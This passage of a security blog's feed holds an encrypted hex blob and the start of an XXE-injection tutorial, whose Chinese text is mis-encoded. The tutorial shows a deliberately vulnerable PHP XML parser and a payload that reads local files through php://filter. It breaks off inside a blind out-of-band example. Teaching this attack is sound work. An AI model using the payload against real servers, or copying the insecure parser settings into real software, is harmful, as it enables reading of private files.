d4fb8c15626a04af397db7d2b0b7eab073431a8a1e795ed508735c6ac5a219cfcb724a5c400ea1415e3764a632cc23a00aa837025087420bb4022f376eb3328e70acc5e88706c6f04ad1baba00f4382543ab29e4c175242ac58c92e6c1ab0059b175fe4905d7c77310d4a56a0f85bd0b627ca09b7c853e05d3056e1ed750ad73e4e1ebd5e86ede246f09924df0415949221d1dd308eec717d7a583158450ef7672ab3b2c17b5b709cd9d8df37ce294b6d7d00fe946cffee8b5be92a63a20014b0348041f27a2239e9de3194f59a545d457b283aa00d2cc8a263203c7bb271e12a3e0c3cc11cb8fef40c64b0a5b6cb09ca3ea4b5fd7f37fca1ba01f8795544abdfcf462357d443d754d62abb15b06ee0bb8b9eb59ca93cb0ea76e1ece61dcb6564d7982e4066fc74a2b55b6c440ecf56ab41bc7da6bffb8fd1e79c4f17704483fc7b0bccea8b7f308cccc88860ed933fb4c30abb72d4ccf83caebd9f00bcc46027295cdc46da998a023816e8d4935961d6860b9078cc8fb938c2e8d9c0e95461c055bd7657e615a26eb6bab5c4f1ee9a342508a67c5d9909b08341382553f90357f48231febb1bbcf65b6322824041c5d5ce793b26d6cb7628e44689967dbcd1e629edbe3aeec5f5fc3d600168064f3fcf32d02e591eb8d3e5311ba037106b136a4c6d943863f9a06577b67d61aa1fe5dce1fcae677a5d0cf0b202ac8295b370c615989fd27f2cc9d9ec54f734d04680780ed70fc0ff9aa06973114fa0e2895fd35bdbe800ebcaaa8f6932b28eee6ac0969457dd29b68ab03d5139324f76cab8ba3a478f651bc01c35e67db787c27901bab7527d4633b45c0d885d0cb74146c3fcc4c4f936ad4f05c43cb7a78cfa2b00382ef0cdfd923097dfca599c88da622d18f06e96c7c6b249acbde5aa9b3639a4a8c3079e1f4d6591bcb8f88b425ea86a49988a7aa7429cfdda542eb38f7e4e96ca14c526400c4cf1a9b34270c6cb9ad97d959e6b3b6017fc67d5bb886d27e6929cded80432089e523a6b9bcb1cd35b13b839b6a58cf62e6afed75dac42809b37beb69342a507c3525adbbd6e8649d7534249e9efb0c6d4a41962dd5e6dc79b7f727bcc937de438b1d6dd1c1301257881c89c8a3c9cad7bc7df96abe4029d7f0ae23933b3e19538795e623e745c5be5458366019d2f59de428445e21ec52bb36a75fb89226d33db8f27c6f41b19f884f71e2c9cfb62d49e945458089319c32532ead51c11edc7d2111669dd9a4d75f2f3c5e22e2d6ecd35a26ab4dff80aeda275e6fd3c079b34c12717bd81fb6ac089296c76b3c10621f40bb54be0ff39523ebba5aaa78a53d3d7b37ba1f32fc7b8082bfeeabd281d6b246ce2bd871cb1ffaae80185e02ddba77fda56561cd91b5f83ecb67a851fb820be5b4b06710a2e22afbf95e6d9bf52290b024c9e17776f5bd07e6cbc9ce5e5862a0ebdec1c0407d666dd90082af8cc6e13659c5971f8cbe8e5ddea5ec17a356733612242164e84be6bb01e8043861f1a410dc98e97273b7e2b778fb7843d732d9ff7d0ef22e19db220ffd1898cfcff5b770e8eeadb1c27119af872e8d2136e0934cc7254de14d464034685a11003cc7e240b8f164c225e319574599ffedff4b62f9b2009f36ee1ce6ce9b019762f2b65a2a63fae7dde1713c0af82aa0dd837a7272e0604ffd9e138510f4d2a067dab363038b6ba33b5e24175fdc772807e40ef74ff9b344d08b67a5a25d45b696febade20c3acca557e882a64ba600b53fe18bfd00c6a7315995abb3004e38312e0617dbb3dcae33606f08ca11151ed626289a107c79f4ae9d0a5cd4c6084e0397bdb3d638067253cd3839382f9dc7efb12b6d8e88f23d1dc159ebfd1c7e2e7ebe0335b4ae9b224c4e3b4445377cc620aa95e60fc4814269baa59726a6058df239b303d2d36b7f7f56f10fc63b460e57ce00e296bbd514940b29f67daa3fe9ad06fa000bffaed29cc7a1f7da3f01716fd1a3d58e4e7ad4177b774de40bdc7c0c683cb6b59ac37800d723daa6bac9157b145c263fb12902ec5359b0c54650f30d02fa9f0fbd818f6abc9b393c3013950e0f8bf48e1cfa0c3e8963be95758de4d6d22afbfc6755d61d8c8830e5d20f8c66f3728cdde10638505280999f47f1dfb111d69931cbbbc48289d2ad1be3c197ee102c8f88029c58f42b6f68d6de5d45b72fdc9564e46acb5221a01af3ba08bd4c1b052b33018b90046fc9ce7e0362b5bbb21cfde3711d9706ba36ad868c6c4a4324a94a3e9846aa55316b6873ed4c7ee39ee34232e4d94e5d2282b62dc84a60e8e23de342a5f9dafb9069d3b15db177caafca0633be2ec5697a1e2979037c9e9520d932b5b8f4a4a105ab8deed1dab44f64ec4e8106dd8956558458cf8b3b4c3bc9a866d231b9c378d0434cc0abe2f9589d52a66d3998164cc3c33857ecc1b53b6af86bb77dfb8a465d6cc28c6200506eaa3e5ffdbe7fe0333d445d1efe72cb843684f44b603a786a02167da8c379490d10ff98aaac5a0c54c3b3f16090123a79b51af68e27ab03e83c8ec4a38734482ae5dc3b76270cda066e410a24cac58bac577ee6c486443be3845665e4d976d1e6c2bc65bb399fa2d5ec429c5578ff09b31757b60e4f4a4139a393f496b15bb801de774fb3552ca1887cf607f21a4347d3fea8e9fe2d8d35789abb6725054a062242f7b6696e71a0181c8925729dbf65eb35cf229cf40c2ab062da3cd18edd4d21052fea9050d6714c727c9bb14cabe0599221cb15d7a04ac604d9b957df1511862e2113c5ebc96451eceb65cf06dcb8c99c627a75880a98e6ef896c8eaf2e7997844b0b6e6d4182b1dab82efecfba12988f206331642c932bc34b6bd366e2760311f4f8290d85925f3153b0672324a9fb3cb9f3fe895e20f9028519b28e612656f472291b29266ea58e73c6e1b4e61059a8a8a55c0783baa1eb2879fbf1de3aaf9e3190ef36ae32ad850f5b681190c7e959b88aafe8a4316c99138ba596e42147f8f4a7b56ed920cb2c80168955d9cadfe2855bf9b786dd45a4c8cb4a85dad6329e79ace318deb266be85a7920c421cb05f7a18b62f7d4895a595c4016db15ead781cf27b85c2c18dc36702fee145e46e32b9c6e3efd9865c05846ed2824dde4cbf643b4dc1733d4a7c516c398b49305033b7b75792f58097e41548da70af5a730c62b38e03d27550fdd9a99b0adba8b066333e6b2ea15aa9d70445db9067d45d8a24c01504f83ac10761e35e9e1b2093dae265d5a1be02fd67b8c39c720e71db4b6909d9c2500355e5ed332f7d0caafe89696942a9bbaa9bbd588dbb03e23e419eb2339cdfa3955e5a092963e8f98ae27a88629607906957400b1d7d04616166802ad19e8743371da50fbf33ad140313d810073d3833f1398d719378202a8abb81105154483444cde1cd4650188790b0a603c51938f76bbd18ec1462bbc1ff28e21b26c051c4a69aebc24f05b9457b8326e3870f6682ff42fb654ba740fc3a42300ce9c8fcd7edff9b0bf7179e9a7ac3d2fcc0a228f5f711525836da715c74f81f8fea1a7cddc7e76605a2c286d5478b4005cad8e2cdeda50bee93ef220047b2a35fe63f0e2e700983f7466fb3a652e30811e3b6ef96dd2523d1a48d1e610b418e91e5211864e2bb1ef6c59e933e550aa76e3fdc4c8ec2dc20fc95970234fa039129a44e5b1f8297eb70d7e6f3f5ef6287e68fcd246fe2ed78f6250b8ec220a9a86241dacbf681a6e5e4308032d7095bce3791d6d9740f273965f7afd364a14b5972b78a8718d1f8608856d57c26bd9d45fc92b49b2bbca7f798346baf217881a5ef15bf8913a7f99fd8ebc0064a0352d67c7ba4aa001a52ebe6dca51ee47943827946e96afa3bb5abb0dc806d67459533a3e3a7f00cdcaa0db8b25d02c0de13569bab49f1a3d6326b1755120ad9941e8b0bc40989dcf1536007eee5ce2e3bb9dd691c109f7353c4abd64512801bb4be35185c255b9502162b551a5e6827f0a1c9d719e28ad9e22ccfe70f8fd6a59caa7ab442aed294c9c85286cfdc8f3b28be03de423950a50e6383d7962b8ef65e3ad69d2790870b58317d676cbc451cae0c31f067df8f1f51f426da8474a807127865d45819877bb635fb6973387d36f8844b629cdb4cf08e0187d2c6b2b98c78bae647875919556291eabfda2578cd9562a6365f1eded378f0a3e4777688741ba315db64199e762337ac3a69f4b084d452c04802890dd29db75bf5e6b28454796c3f447459b9a42e83cb52d5c5ce950fbe732672f0b30643f4991bff7bc3c5bd5f9bf74cf56099ba6f2c8617682c5f9262020379c7400f3832e141a61f74678de832b2d1a29904f60eb9c9d8cf6151afa5b8a9a6b562b429e8b537fa4abe1dc99af107a93ff0ebe6d32f9078a22b1428b09dc869ad13c4dace8723dde73bebb6fb977e3a6516dc69c0351de2b404fc4e5c581befad59ebfa9728cfc9679b492c2d4d091055d5390e8d91aa596eb041579181015ac7594bf4ffac6916c221906e64f32eaef033ad838c9abd65bccb815a3236948747881cc91d3c3be5b165083ee0d67183d0adc846832425e7b1262ea1b0cd159ab603a6a87042592b76b50bb0b46e3ebf3bd1e62354e4ecf5cefedb81e3f46625afcf12be4673d11a6517b87bada84a283b72b7c73c48f6e5335eeac4a09f3c3dc228e9721981ec34124ce66a047a698f2b0ffda36db65301f7d55c325c2e3ee53c4b7052e295f06b03e39a23c990fa7290cb5a745845e09eec3e9f993b351b928e1198e0acd3569be418effd491d8822f630a70fbc7c73913812313b245bfe13b35f00fe2bd7a88cf0ec1c712670451ac25a38236a14faaaf3d22bff7f4c1cd3d1f1af26785234f6b88c653f682c040b0e4ffd2c379679d0857ea22e660329b7174dd34c83c61f27ed0322ac76334d5740c2b11b9a6de8a8f6bd75358a04490f2e144613c80741ebb87be221e7a7e4d4a3669a51b8d6eefe66e820292659769d2e16b22642e8cd5defb31c84f02af4f1b569e09ce4052eed45e1714cbcf62b4c763f7e819d0812254876e18b55df9adb91c5ac8ae749dfaa0da98c591b51a7e508406070fd4792ed30605d29eef69d25f3e5e830b1f1b197bcffaf2e8e6ff15abbe0d442beeb490f78f171740ff4557e96451fd578fdcec5528593316f7305b698c3029aff05a5db1da8949a7699dfd4e33ea1e76cde74023140666dc1859e4c4c9b2b977b868b80ff984797415a9cbf3599868c28a765eaf289fd683bb34943771f2301b9f2f39cc9099cdd5efd9fa6afbe64dde5ec2845fb13ce367348698ad9ce3936cf36a6ace3a259a08e4aa2880868e1fc91db2dd52aeb0e162bcedbfa4ada8ef124b40c530c9c909d5cee8d535e6312fe41047f1b2e69cb02b2c34e1c55320979d296846a525ec3e2bb470f74dc367540358a85751dd059df5659b522f8fe718a80ef55efa2c74ef61597416959548bc768677df889c632f9ea3289803dbd54edfd663a236a36fe992c45c8c631318c9df3bc42b290ef9fb0c5fb34fa2b69f8be15937492883dd752f397b0e1123271a8e268a2adb1d39cc1239bf1e44d7511ec438260cce75f74945d4c52769842f78c00b45bdef11e007416149f03f6661ce1caa3a7e1360d9229c112e4892ecc231e32ae8e4ab30c4d2a896a093083bccbeef69f752e36a31cb2cc1a1b32c304d45838a709b50d2ebc75d55b4d77e1f6b06d31b694cd6ee9c3ac202101b5677c517aaafd693fe033ef76a0c61720a6e4a3ae457ab77a1e1b61933eaf003dfb496c1950e2bcad7173bf0bb5d0bff24d17ae1d69f88de58281d6b95a73b003c55ca8fe1addfdfe2b3f6e9b9ce3425f7ebba2e32dd9b56c84628409d2f49e236156f158fcc59b09629e4def33ec82c2af74bc09ff06ab55e972d9717d7574ce515ad90a631dd0daf1004217f4e766c644e38b18fd49cdd0b5ae153af53fd4dd0214dff46bafd185f29c8631c2b583b3f94316ace67e1ea23e5ec3809ae72f59393e5fe7016ec2e0587cf27095944bd9585c026bdb86e0c5524c105ec882d42c53f11db35ac3105554b2ff68052f4e1545cfa0e6da0aaab3070a06fd4d4aca7db90a23423aba0d8ccdb19670d12ba4bb590ba93c914b34dbb1d61e8c7cb42c9100ce8fbc19e40e1e930ec4ed0ef0113bcc1397e6096fbd2425fd3906252cbf127616bf8d8e36467253d7133793c4f1f5dee907a051e0410c65036d8903a7425a60e3152398c8e989112480a1072945893bcf4357a065b223b49e001800e9fb753e59cc240c7ea059ba2a35bd71d5976bedc5a63e57d375eec991a73c501c4091a156595416f594f3f83e4363cf341594622926c49c293faaafc2b6bb235c90f33797e1d92fd422e8d62d0fd557f91054cb9c19ffb58b9f017737d8037c06422d6627dfe8d2edec93722127aac65814dce22523beae57ed9b7b033fe8950e9277add1982db163cb73766abaaebc03115701723bd3891553b70b19a605866d87bc267cbaafa5054ed4ce91229b5b5b1c0b6d215a8ec9a03f7c4d36874549eba6969000eacb0d0f5874fbc90eb4f118360474dfe48bdd1915818670ce2bcce54aa91ef8ae37743a2f07f776215687734dc3eeb67221111c2113e54e95b86e6439084f345a998bedd35c36135ab3b4e255a318fd8060917bf415f07cea645e9fa5cefd504a212cb7217bd751fc4a16031398148b76b0a171223573a0aef2fbfb502cc880ec605322be09da2dfe6f6aaf79222e691fa47d2c879f2fc17f5ed341389b6f866e286a0b8ac3a152aaf6729be334cdb9e89a1cf5006a95633d239c0753bc63d690c93e1d35b209bedf80cfe07baac1060cfd702a9e829a462f1edbcb12882e38c6b9baefe44809c4f91a979584adb8817421a7c35beb318db3162b0bef9c4c840a5e786a396abdbfc5e1a0af19bb42a71ae7ca0d5ed06a84497ab5e3d24ca9c67a17aba0811cff8fe0cb6d4a05b258df9ce331fcf630651d85fa0cf68e6192418e3242d753e708b8493dd9edd71747752ccb8a1d78af5006130241a2d5f8f2a7c172878501ebb2edb1372e0ed1c00a02a7a41677c5f20f987335ef7ab4caac26b88a0b4d8862b3ca5f5be3f78c5bf11c857bd5ae5ea4dc6426157f6b92d63571b3d09dbcf027ed2a5bafff8d8faa6de6a71ca95ac45c0a3b183af878f57505b7712726e66552f972591fda586f3ab4d1eaf3b458c3993ddba5f028d8bc4226fa6ef46d2ce0b29e7d8280fcb0973518e45c00b2212ae788381bebec4d215040399984d8c22fb6be95c5563ac2dab200edbf123e1397e6a369c196812cf2e1660f26bd46eb0dc93552a491ec15964586d0992604921f7dbec99087dd5ce2b5bfc821fd3a18609c962839e8d7ea2cc7bf96b72fe6c4fde1e0938abb474aa7824a6377016a269a8d657d9dcdb6bed1637f36a27513dcc6bf729ae5456be29e310ba2568a0024be4ce0e5e03492aae0d195e023de14eae5b1292e029483ba9ea009e52d6513a62f1d3313a2ae26a07c669dc2cb31502ad6777a3c8f13628adcac5837d1c0683a1c6f7da951915cc03498acda3a7d602eecadd1b9e3edc59a8987b580215f731852c8e192f92764598c14864e06f353dadd655f0d4ff29fd414e84e1cd7233d2044f641b779f1d42948a640dfdfa1b5640dbc8d92b4b4fe852717a912ffb3feee71c1d664319976b184af0c0d3d9b2189e821622ee70b8512fbbcc82e48bfa42f53657bb5afeb5bacf7d2a8d7253fd71ab20c51242536a597a09141664e11a9c5ea2c8d59bc2f087d15cec528a723ed33cbf3ed25706e5b01ffcb0cd73a0003630a11aeb7af0f60765008e17e2aa13278f28987f5a8c7ba4810ed89586e2dd52febd4137a0e2ec580fad802e4ac351bed9bcf3ae18100a4e2587783de6ca6fc894de57a1045c1f648052cfb99e32c902c724914b1e57ad69fb4d5a3d4d7c9ae0724b2562e9ed7204598ce8d72ec91a5e330dab8a9249505c4ac77990f5ea591a1512904477adcdccc10e5681574b7aa758112371de984decf91ef550d1b285681e2ee1d0d822870b1bd19d3b95079186163e162392c1b5c84be22c347c51547b78d49374de41be01d6221710ea215fb824c769034cf721c5ac57b218011bbd40e968a084279ec590cb754ee9cba8e3920fc0c0134f1a3a3ad6efb6cb0134c55bd35253201e1eacdbd8d7fbb7378fbf30ae3c2f340c261378a94a072ab090ee86825d01fb794802adb17cdc6e5ace028329447eeaf170a981fc79e618478be4fb5c784964b5770e2e935ed8444a5f3b9e35cc79ffba6d557a48e43ea6870e95af37808d99982cf73998beea8c4cb3eaf784d1d06fb2b8287fe686aa74d45d2d73dde882e1b80b8ee2383e6b902f302f173044f514240e4e61d6c77bfb205c8d33a3045f69043be7bfb8257ae1d5dab973d8b1b2a13dd2f3c25463f3f607c9826e55efec1241ad85820ce3ae1b9cdbb129481846af72fcdcea3770fe5b74ec8c3eca62f69d08b3c22398188ad7da1b49cf9c19302f1a0d3333c655cd8e75eca21be42e2f5f150f91e7468680db0150c101d5caf7e5cc550d441ee8a120d936f1f3a0a615ef052c17330fd5e741dde2cf3d37ee720626327843f9c100bedb2dffea335d41040aa51d962d5f1efd6e51f4dff6051a0a8a68b4294797867f12f476b03b79d286df21fa69a9abd7d2f54b96a7edbe4c7befb1b2dc59ca59a560ced6ce1a25eb830dab31423616e54450dd49e1c5f8c1b23689ddfdcddf3083ac883171b8ea11cf99240ea4f99bccfcde08bc05062fcad22c3141e76162fe71c35029a78d0444e9cdd6c442508dcf04eddce10d5ef9a7e3037771d14124ee14ee9dde99ba796f54ec4ab7525e09ea0d8d682267d82938f06c3e6105ab6b44d1cc6e6b55b68b7da6bd97cf89e51854716f91e88bfa01d05c795d53d93dc9324812debe0326e350d1bde4730b7cc640410979016b16460629c443a8477fdad08cf0052447597eef0ef8d799b5fee3a788ac9feeda472cacac536922bf734b86d80667384fcc31a0af44ee81a67e040ddedeae4d8b4802f721aedea8666bd74a806d87ccc494827ddbab5906486cb27ba91ba62657ca57e347a3eec0ac41a5252353bec460335049b2d9f857d607c74e5462e536126d5ea62c0632c0fd6087931da861cb31b98b87b9282c6c4b19040d59f77549e186441bce6e77283e5a784859cfad00693f5b827483d4f56babfe4ec410f59d462faea5427dc05d5d56a802b7c919eecd8e4a29278363b9fa9892107249f912b5e062d9adc27e817c077ee084e0ebd679de520511be490bfe5f29a1864b35c779b6246b13c1da1a0742a7b3cbd0bfad5d1d9f146619656e22dcc320c8a9586b0cecf2d466ad7cc0e5bb3fc056de79c3f5ea6fce7f60f131591c116cb887d6129aa83298b2149e1c6fc72c6e8b5e02af95736c4195c5ee3fba9273c4e6f95b95fe6c1b518dbfd393108b770d00957d22169477429b544b43b9036cefbb383f06effa14ed0c4c186ee1d19c4ae5257c3bbee6e9f3d93464d715ac6f425194c94e755c5f3b17616b29a2324edac3af1b2eaf597c35fce5495fda4bfd2f1a48234be4ecb2b68fe6d3a4d8e7096db6376423de73272274d10192898fdf9acc4b827027622c87b3eb0f0c6fb3c80b3047afab15484da56dd2e6e6c8d46fb6a1e02ff60d844cc512a7c1242d62269a02cc0e93093c8997427bb0c6894a07f0f187ee11dbb1db61f03471896d4d977d792b37539c9c2e3d2271f70fdd9676e580e2e596c347df5380838eb67f6e614214bedab4061b6fc4d5876637b1ac22849cdb5c1649959ae0cd4ca259ad72b2896ba356427fd85b06be13bf8846c281d5f82ef086721d413827b6c84add498476c89159b20e2630d9ece4075463debabca5593c04f73b9f4a7bb5ed48d953fbce0734c7e90db38b58c4a51f7dfce79235f7efb08d4509af35f94b1d75bb309395e2b7d735d227987006de69ff322e6b741f8a47c37937680364df9c1142601a5169d1e9174fb74a8268f57ff4e45bcdf777b8bc5a42481eb17ec5e3c762be0c184251725a823012751074644059f521c0d942b318fd4b870c3b43bf56e78c2cf4f195dcc8571955e81781100cd0e1215b7c6ffade445f1187dda53c3c85b74db88f34c0bf2846331817518997c8151aa04d582911ef35f8be982ac300f35f3f8fb36e5de7bd6576afc99872014b3bb5b314803c19259ab5d8abd9aeb9607d7f6e3029930d39ae19cb5804204675f791bf421dc3a5ab298465d5581e1ff36e0d8d325934a68ffdd88736841255d032edf3f15b4af7a101a7bd367665879f99102bb84ea9180c9c62f17d9adacdea12846551997ad3ac3b18892edce78f05e759187fb2381781647b0a6039bbd9a4f853cbed6899b9b441738f68e114700a410695eb02403d25387a94089e6b7c250b42381949a59d1533f3a29ed5326bc9b48195fed1be27c47ae74b7888d1b0ff0fb8df49aff5f9d7860bda20844446989c83e643757028dd5b2a9fd863ae05208f68454dbcf3542bd063916911b282109894976533f38ca2f55aee275572fa3a52bb456079881a172a36ba565e3e8ec794d21b85eac048efaaf86f0a48a8c0594066a7bac3fe92b63094c2d7f803a39ad8f1761d1e435295b32996f2dbb4cc19f0839c89b64711e24d68c3bd8a4159603de29c6c886e23e811f92da887a12e2377d198d5da6e085f221289bac4ed7c6daf1f74875e89f18eba12ddcb2f756be51cbde1e2d054b5c76fe7e7ead113bd1e8a6b05d553e7d8975dd1a8419486d58e06a4b58feac76d859592195b68259a9639805d2c3c58de5d46bf4159caca23f472762d5682060f820c292eca2d581aea1aaca8b47bb835d4112effe1f23c6485f22ccf7e252d3dec3e07382ae48ae7a8879f60a5653a80168624acaf16281d466a14120261d34659861930f75131e3123c5da56e96ed535d9e2b9c02057fd92ded957df2e0e1c3d442d93578f309b14e12b985163d9864e1387c881f1d4282e5ea2b5a9d02faf4d636ca4fed4d61f01a94bd5b4aa744933924834c3d70ddc806722fb45d37bd1394cb157b5bd72c4c80267e3294007149c169c385d5b9b783cef97b1b303c4371332ca06d268f5d0f6eb211539f1ec4cc3ae615f2cf190a1827845d25c6237100f13738873b95324ec32a6ebaf9dd0fd59c38c4cfb00853a363688e3e414cba9a0ad16796b9e496f34a685df143ca5c33700be0cc71dd84018b95efd1f50b69004893c7f136bb4dd9a363978aa262a9d468d225fe945d0982cd6c08af6ba6204a14b05dc1733026e3b8acdcb5e565a8753c29d70ba448cdb65a8d3b0ed99bc096c8fc45a6a910f7828ebc63864d8f7510ff4578ebd25fed66a702ed6eb620a0481a245e040dc825a9f674d3b114cc27a7919c23e5d5763796db4c29e5620a8b8db315dc63db5abfd0d22e3a3460078a9869b73aebc227859c78aacc429d02799a5fcb5ecd6446d8148ab600c5538ec2256b9540a6b33c38212663fef509bedfecb2182b002b85ce19bd55f024ebc67e0ca5e0b2988543a10b73aa2ae0c02fbca5cd21a12c84a6cc733cf9c81fbbb8e90949681a6325588068070ef680fa3b36a308d56c984142005cd28d6158f2dc3b026ff24f0864a77e4c8d1a78cc5b792bcbc3f34972461b5678eeeb5de773f4afec2b01c123fb9dbec62057f20c4b10f65d2141c1fc223bf8dd3150f7142f9f183cc21472a1a4cd153a0625bf0a48139bc77bcc48a8e0df8f4e100c466ad665fbdd3b73d792094711894039e65e18d0bef7afd7b6d68cb63b6b13a3cbc4487ab5a3ff836e7a4e92cae3ff331c0e3d072e88485ef6b27cc8349450d0dc76ca803214853edf45f45e9595bdfad210d7dc9cd9b3fd4a93754883f8585267ac2279ebd90e53688822b9a18fb4fa294ee19b3e2e718272339dd4dd5a990864dc26d164d657cd4380ae056dd50e61d7b8dd7c807e2a2e812ef8cf9c33b1e7be9f58b7a5a7a3b0d83527457a9c92b0dc811fc8fc987c87c21236c23411937aad7ca154b3dfc308b646e1320a376517e2a39438921d5baa77656ee04c4e57aae1711f486b2ad4739a6a0c4084bb74ff3a93a706e8b2d9991beec078db7cbf287cb27ca947e8b6ec512c142725698e9acb9dfc4179402660eafa85e7fb58b27d8512b0dc61bc0475d83fd73172031cba7eba16ebbf54f236c9fe95a2a144a209f166f17a4c494bda5f376714663750d7c8a4ad5fa1b2a1fe5cfab78c38e343689d2e8bf250196400885cf8a96fdbec22d9e1241c743311c4d744ff5f051e7d0687acd1563028d194616f19bc3c00a401223c6eb3a78000c30c6657e64d1c790b2b519aa41c3de57987942aae0684c97d7d79669875f92bdc4381272506f00f9b6685f4a8068ef34f2e5e6d8bf4e7e5d19f15d8da60edee592ceb6a131b73359e14664c2950a9d52d82fab64e4a0ef0dbbb18d17459b0803da68fa0e5bbaa7eabb030712617a9bbe03dea45086304af2dd667073c71482a98380785a5da0ae9e0606d33efcd86fc65662c10a57b67f5aa4b9f785d142758ffa06b4056e3f78cf524feb63940eac6cfaae3d147c8178b248df12c0ed5d32f30d69d65e20ce25c568ac2f150067f774fac77bb62ed4b06991102656cccdcd15192d9f01c701ccc7d5cdb54d59761941070e9a4d8dab087fc24ec4dc43d899eb853207cbeb9af5f3720ea5952c6d576559e44433f6285e5ebc086c3af6350026c0a7a865458725038f7f84168caeacbba6b19e4a6a061ecd248134fccf7716fbbde533ddb3d9d6db25707d3b7cb791c73726f256724e3cd40e9bbe7d053cf1724b0984c9383cf020e37ab15f95ee4d4048c6ba22394bff007aed01c2f9a0bc43837f4ebe6f43155ac929ea8e28d77bf72a1f03c1488317fa6a287e0c33786809e528ab66e4dd0ab794049ae96af7a46a03b583df29fc4730ef68623d5143d25dcc6d71d2946f128d3297ffce97a8137ec1bc9adae472c641560fc05213edfcf8a6f4d0d473cd6340b02735fb8d7643f55654f9c6fe1472595be08849935382706822a8e6781a7b51229ca486c2ccb987f9d0d16e9945f86fcba7cbab857f75c6446e2391f09e65e5879422eb34059ee4e1dd046266cc0cc83de372722a75077e1b0b05e49350e62aa9d3f4e9e44e21b332ea409629fec5c66ca8c519c951ec9133c000da98743cb001cecceb6e00d65b769bafff10d3311c8e0e1a93171689bf4bccd7a57e248392dfa0cd025c30eec3a741d6dd57d4ee494035bfb182416ccec02d84d43f5db78fd93a24d8d77f5bd48e8aeff7ec2a95024a51365d86150707ccae5c0e7161ff8ec8e2967e766fccd487558675299bec8a6fa1d31347a09b97815a2bf56ff431c4871e5f3ab2232d342e55cf9a1100ebe27ecd2774fbc21cd05fd8f2a17337f20c4d71746ad6ab0ae8ff5da13043d7177d07eae3c2a1009b1f40b118f66fead4664ca</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="PHPæ¼æ´å¤ç°" scheme="https://0xcreed.jxustctf.top/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="æ¼æ´å¤ç°" scheme="https://0xcreed.jxustctf.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>XXEæ³¨å…¥æ€»ç»“</title>
    <link href="https://0xcreed.jxustctf.top/2019/12/XXE%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://0xcreed.jxustctf.top/2019/12/XXEæ³¨å…¥æ€»ç»“/</id>
    <published>2019-12-18T13:04:29.000Z</published>
    <updated>2019-12-21T07:38:16.072Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>XXEå³XML External Entity Injectionï¼Œç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„ã€‚ä¾‹å¦‚PHPä¸­çš„simplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“ï¼Œæœ‰XXEæ¼æ´çš„æ ‡å¿—æ€§å‡½æ•°ä¸ºsimplexml_load_stringï¼ˆï¼‰</em></p><p>è¿™é‡Œä¸»è¦æ˜¯è®°å½•ä¸€äº›Payload</p><a id="more"></a><p>å¦‚æœè¦è‡ªå·±å¤ç°çš„è¯ï¼Œå…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å®‰è£…php-xml</p><p><strong>ä¸€ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)</strong></p><p><strong><em>xml.php</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><em>payload:</em></strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191218212649252.png" alt="image-20191218212649252"></p><p>è¿™é‡Œä¸€èˆ¬ä¼šåˆ©ç”¨phpä¼ªåè®®è¿›è¡Œç¼–ç ï¼Œé˜²æ­¢æŸäº›ç‰¹æ®Šå­—ç¬¦å¯¼è‡´æŠ¥é”™</p><p><strong>äºŒã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</strong></p><p><strong><em>xml.php</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span 